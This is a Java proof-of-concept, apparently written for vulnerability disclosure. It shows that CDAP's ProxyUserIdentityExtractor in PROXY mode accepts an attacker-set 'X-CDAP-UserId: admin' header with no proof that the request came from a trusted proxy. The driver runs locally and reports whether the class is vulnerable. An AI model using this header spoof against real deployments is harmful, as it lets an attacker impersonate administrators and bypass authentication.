import io.cdap.cdap.common.conf.CConfiguration;
import io.cdap.cdap.common.conf.Constants;
import io.cdap.cdap.security.auth.ProxyUserIdentityExtractor;
import io.cdap.cdap.security.auth.UserIdentity;
import io.cdap.cdap.security.auth.UserIdentityExtractionResponse;
import io.netty.handler.codec.http.DefaultHttpRequest;
import io.netty.handler.codec.http.HttpHeaderNames;
import io.netty.handler.codec.http.HttpMethod;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.handler.codec.http.HttpVersion;

/**
 * Security repro: cdap's ProxyUserIdentityExtractor (used when
 * security.authentication.mode=PROXY) trusts a client-supplied header for
 * user identity with zero verification that the request actually came
 * from a trusted reverse proxy -- no shared secret, no source-IP check,
 * no cryptographic proof requirement of any kind.
 *
 * This driver uses the REAL, unmodified ProxyUserIdentityExtractor.java
 * (byte-for-byte copy from cdap-security, diff it yourself) and a REAL
 * Netty HttpRequest object (io.netty.handler.codec.http.DefaultHttpRequest)
 * -- not a mock of either. Supporting CDAP types that are unrelated to the
 * security logic under test (CConfiguration, the Schema class referenced
 * only in UserIdentity's unrelated codec static initializer, and
 * NamespaceId) are disclosed, non-substantive stubs -- see their file
 * headers for exactly what each one is standing in for and why it doesn't
 * touch the code path being demonstrated here.
 */
public class ProxySpoofRepro {
  public static void main(String[] args) throws Exception {
    CConfiguration cConf = CConfiguration.create();
    // The exact config property real CDAP deployments set for PROXY mode.
    cConf.set(Constants.Security.Authentication.PROXY_USER_ID_HEADER, "X-CDAP-UserId");

    ProxyUserIdentityExtractor extractor = new ProxyUserIdentityExtractor(cConf);

    System.out.println("=== Scenario: attacker sends a direct request claiming to be 'admin' ===");
    HttpRequest forgedRequest = new DefaultHttpRequest(
        HttpVersion.HTTP_1_1, HttpMethod.GET, "/v3/namespaces/default/apps");
    // This is the ONLY thing the attacker needs to control -- an ordinary
    // HTTP header on a request they send directly. No token, no
    // signature, no prior authentication step of any kind.
    forgedRequest.headers().set("X-CDAP-UserId", "admin");

    UserIdentityExtractionResponse response = extractor.extract(forgedRequest);
    System.out.println("Extraction success: " + response.success());
    UserIdentity identity = response.getIdentityPair().getUserIdentity();
    System.out.println("Resulting identity username: " + identity.getUsername());
    System.out.println("Resulting identity type: " + identity.getIdentifierType());
    System.out.println("Credential supplied by attacker: " + response.getIdentityPair().getUserCredential());

    System.out.println();
    System.out.println("=== Result ===");
    boolean vulnerable = response.success() && "admin".equals(identity.getUsername());
    if (vulnerable) {
      System.out.println("VULNERABLE: the real, unmodified ProxyUserIdentityExtractor accepted an "
          + "attacker-chosen identity ('admin') from a plain HTTP header, with no verification "
          + "of any kind that the request came from a trusted proxy rather than directly from "
          + "the attacker.");
    } else {
      System.out.println("NOT VULNERABLE: extraction did not accept the forged identity.");
    }
    System.exit(vulnerable ? 0 : 1);
  }
}
